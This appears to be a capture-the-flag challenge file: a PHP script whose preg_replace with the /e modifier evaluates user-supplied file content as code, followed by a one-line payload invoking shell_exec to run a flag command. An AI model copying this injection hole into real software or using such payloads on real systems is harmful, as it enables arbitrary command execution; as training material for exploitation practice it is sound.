#!/usr/bin/php
<?php
function y($m)
{
    $m = preg_replace("/\./", " x ", $m); // le caractere . est remplace par " x "
    $m = preg_replace("/@/", " y", $m); // remplace @ par " y"
    return $m;
}
function x($y, $z)
{
    $a = file_get_contents($y);  // transforme le contenue d'un fichier en string 
    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); // remplace toutes les enchainements de [x ...] 
                                                            //(... pour dire que c'est tout les caracteres) par 
    $a = preg_replace("/\[/", "(", $a);
    $a = preg_replace("/\]/", ")", $a);
    return $a;
}
$r = x($argv[1], $argv[2]);
print $r;
?>

([x shell_exec(getflag)])